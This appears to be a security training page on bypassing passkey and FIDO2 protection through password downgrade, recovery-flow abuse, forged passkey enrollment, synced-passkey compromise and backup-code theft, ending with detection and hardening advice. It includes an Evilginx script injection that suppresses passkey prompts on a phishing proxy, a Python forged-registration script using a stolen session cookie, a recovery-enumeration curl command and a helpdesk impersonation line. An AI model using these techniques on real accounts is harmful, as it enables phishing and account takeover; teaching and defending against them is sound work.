---
layout: training-page
title: "Passkey & FIDO2 Ecosystem Bypass — Downgrade, Recovery & Enrollment Attacks"
module: "Web Hacking"
tags:
  - passkey
  - fido2
  - webauthn
  - mfa-bypass
  - downgrade-attack
  - evilginx
  - recovery-codes
  - enrollment
page_key: "web-passkey-bypass"
render_with_liquid: false
---

# Passkey & FIDO2 Ecosystem Bypass

FIDO2/WebAuthn passkeys are phishing-resistant by design — the cryptographic signature is bound to the origin domain, so a proxy-based AiTM attack cannot relay a passkey challenge to a fake site. But "phishing-resistant" does not mean "unbypassable." The attack surface has shifted from the cryptographic layer to the ecosystem around it: downgrade paths, recovery mechanisms, device enrollment, and backup access methods.

---

## Why Classic AiTM Fails Against Passkeys

```
Standard AiTM (Evilginx for password+MFA):
  Browser → Proxy → Real Site
  Proxy relays session, captures cookies — works because passwords/TOTP
  can be proxied.

Why it fails for passkeys:
  WebAuthn challenge-response is cryptographically bound to ORIGIN:
  - Real site: origin = "https://google.com"
  - Proxy site: origin = "https://g00gle.evil.com"
  
  During WebAuthn signing:
  rpId = effective domain extracted from origin by BROWSER
  Signature covers: clientDataJSON containing "origin": "https://g00gle.evil.com"
  
  Authenticator signs {challenge + rpId + origin}
  Real server expects rpId "google.com" — sees "g00gle.evil.com" → FAIL
  
  Attack: replay the signature → also fails (challenge is single-use)
```

---

## Attack Surface: The Ecosystem Around Passkeys

```
Ecosystem bypass targets (where passkeys DON'T protect):

1. Account recovery flows — SMS/email fallback when "device is lost"
2. Multiple credential types — account accepts passkey OR password+MFA
3. Device enrollment — adding attacker's device as trusted passkey holder  
4. Backup codes — one-time codes distributed at passkey setup
5. Synced passkeys — iCloud/Google Password Manager sync = cloud account compromise
6. Admin override — IT helpdesk resets account, bypasses all factors
7. Legacy endpoints — same account accessible via legacy auth protocol
```

---

## Attack 1: Downgrade to Password Authentication

Most passkey deployments retain password+MFA as a fallback. This is the most common bypass.

```
# Step 1: Enumerate if password authentication still exists:
# Attempt login with email only — if password field appears, downgrade possible
# Or: navigate directly to password login URL
# Google: accounts.google.com/signin/v2/identifier
# Microsoft: login.microsoftonline.com (still accepts passwords)

# Step 2: Spray or phish password credentials
# Target is still vulnerable to credential stuffing and phishing for passwords

# Testing for downgrade via API:
# Intercept WebAuthn initiation request:
# POST /api/webauthn/authenticate/begin
# Check if endpoint accepts: {"type": "password", "username": "victim@example.com"}
# Or: remove "publicKey" from the credential request options

# Conditional Access / Passkey enforcement check:
# Org has configured "require phishing-resistant MFA" CA policy?
# If NO: downgrade to SMS TOTP or TOTP app still possible
# Test: use Evilginx with target that uses password+TOTP — passkey is just optional

# Evilginx still works when passkeys are OPTIONAL:
# User is presented with: "Use passkey" or "Use another method"
# Proxy suppresses passkey option, serves password+TOTP flow
# This is the most common real-world bypass today (2025)
```

---

## Attack 2: Account Recovery Exploitation

```
# Typical recovery flow when "I lost my device":
# 1. User enters email
# 2. Site sends email with "magic link" or recovery code
# 3. User clicks link → full account access, can add new passkey

# Attack: phish the recovery email
# If attacker has email account access (from OAuth device code phishing, for example):
# Trigger recovery → capture recovery email → recover account

# Recovery SMS bypass:
# If recovery falls back to SMS verification:
# SIM swap → receive SMS → bypass all passkey controls

# Social engineering helpdesk:
# Enterprise: IT helpdesk can reset MFA
# "Hi, I'm [executive name], I lost my phone and need access urgently"
# Helpdesk resets → attacker adds their passkey

# Scripted recovery abuse:
# Some services: /account/recovery endpoint accepts username + backup_email
# Brute-force or enumerate backup emails from OSINT:
curl -s -X POST "https://target.com/api/v1/account/recovery" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@company.com","recovery_method":"email"}'
# If no rate limiting → enumerate recovery method options
```

---

## Attack 3: Unauthorized Device Enrollment

Adding an attacker-controlled passkey to a victim's account.

```
# Method 1: Account access from another session
# If attacker has valid session cookie (pre-passkey, from cookie theft):
# Navigate to: account.google.com/security → Passkeys → Create passkey
# Register attacker's device as a passkey for victim's account

# Method 2: Exploit enrollment without re-authentication
# Some implementations don't require re-auth to add new passkeys
# Test: with ANY valid session (even low-privilege), navigate to passkey enrollment
# If no step-up auth required → enroll attacker's passkey

# Method 3: API-level passkey enrollment
# Intercept WebAuthn registration flow:
# POST /api/webauthn/register/begin → get challenge
# POST /api/webauthn/register/complete → submit public key
# Test if complete endpoint validates the registration challenge signature properly:

python3 << 'EOF'
import requests, json

# Step 1: Begin registration (requires auth session)
session = requests.Session()
session.cookies.set("session", "STOLEN_SESSION_COOKIE")
resp = session.post("https://target.com/api/webauthn/register/begin",
    json={"username": "victim@target.com"})
print(resp.json())  # Contains challenge to be signed

# Step 2: Craft fake registration response
# If server doesn't verify signature in registration (common bug):
fake_credential = {
    "id": "ATTACKER_CREDENTIAL_ID",
    "rawId": "ATTACKER_CREDENTIAL_ID", 
    "response": {
        "attestationObject": "o2NmbXRkbm9uZWdhdHRTdG10...",  # null attestation
        "clientDataJSON": "..."  # forged with correct origin
    },
    "type": "public-key"
}
resp2 = session.post("https://target.com/api/webauthn/register/complete",
    json=fake_credential)
print(resp2.status_code)  # 200 = attacker passkey registered
EOF
```

---

## Attack 4: Synced Passkey Compromise

Passkeys synced to cloud password managers are only as secure as the cloud account.

```
# Passkey sync locations:
# iOS/macOS: iCloud Keychain → compromise iCloud account → access passkeys
# Android: Google Password Manager → compromise Google account → access passkeys
# 1Password/Bitwarden: cloud sync → compromise vault password/master key

# iCloud Keychain extraction (requires iCloud credentials + 2FA):
# From a compromised Mac: use Keychain Access.app or keychain-dumper
# iCloud Keychain passes are protected by device passcode + iCloud account

# If attacker has physical device access:
# iCloud Keychain syncs automatically — passkeys accessible via credential manager
# macOS: security find-generic-password -s "passkey" -a "user@example.com"

# Google Password Manager sync:
# Passkeys stored in Google Password Manager accessible via passwords.google.com
# (requires Google account auth + device confirmation)
# Compromise Google account credentials → request passkey export

# Targeting synced passkeys in enterprise:
# Enterprise MDM that enrolls devices may have escrow of device passkeys
# Check MDM vendor (Jamf, Intune) for passkey backup/escrow features
```

---

## Attack 5: Backup Codes

```
# At passkey enrollment, most services provide one-time backup codes
# These codes bypass all authentication including passkeys
# They're typically stored in plain text documents by users

# Find backup codes:
# OSINT: Pastebin, GitHub (search for backup codes pattern: XXXXX-XXXXX)
# Post-compromise: search victim's files, cloud storage, email
grep -r "backup.*code\|recovery.*code\|XXXXX-XXXXX" /path/to/victim/files

# Email search for backup codes:
# If email compromised: search "backup codes" in inbox
# Services email backup codes at enrollment → search sent/received

# Google backup codes format: 8-digit numeric codes (8 codes)
# Microsoft: alphanumeric recovery codes  
# GitHub: 16-character hex codes in groups of 4
```

---

## Evilginx for Passkey-Optional Sites

Where passkeys exist but are optional, Evilginx still captures sessions:

```
# Evilginx3 phishlet configuration:
# Key technique: suppress passkey authentication option in proxied response

# phishlet modification — intercept and modify the response:
# Find the JavaScript that initializes WebAuthn:
# navigator.credentials.get({publicKey: ...})
# Intercept this call and replace with password prompt

# In Evilginx phishlet:
# js_inject:
#   trigger_domains: ["target.com"]
#   trigger_paths: ["/login"]
#   code: |
#     // Override WebAuthn to prevent passkey prompt
#     navigator.credentials.get = function(options) {
#       if (options.publicKey) {
#         // Return rejection so site falls back to password flow
#         return Promise.reject(new Error("NotAllowedError"));
#       }
#       return window._originalGetCredentials.call(this, options);
#     }

# This works when:
# 1. Site offers passkey as optional second factor (not required)
# 2. Site has a password fallback for "other sign-in methods"
# 3. User hasn't set passkey as their ONLY method
```

---

## Detection

```
# Signs of passkey ecosystem attacks:
# 1. New passkey registered from unexpected IP/User-Agent (registration audit log)
# 2. Recovery flow initiated + completed in rapid succession (automated abuse)
# 3. WebAuthn authentication attempts with invalid origin claims (honeypot)
# 4. Multiple failed WebAuthn challenges from same IP (probe/scan)

# Audit log entries to monitor (Google/Entra):
# "passkey created" from new device
# "recovery code used" 
# "account recovery initiated"
# "MFA method removed"

# Hardening checklist:
# - Require re-authentication before adding new passkeys
# - Disable password+OTP fallback for high-value accounts (enforce passkey-only)
# - Revoke backup codes after first use, regenerate on each device enrollment
# - Audit passkey inventory: number of registered passkeys per account
# - Alert on new passkey registration from new device/location
```

---

## Resources

- WebAuthn specification — `w3c.github.io/webauthn/`
- Passkey security considerations — `passkeys.dev/docs/reference/security`
- FIDO Alliance passkey overview — `fidoalliance.org/passkeys/`
- Evilginx3 — `github.com/kgretzky/evilginx2`
- Tycoon 2FA (passkey downgrade AiTM kit, 2024) — `sekoia.io/en/a-ghost-in-the-machine`
- Passkey sync security model (Google) — `security.googleblog.com/2023/05/passkeys.html`
- WebAuthn Level 3 credential backup — `w3c.github.io/webauthn/#sctn-credential-backup`
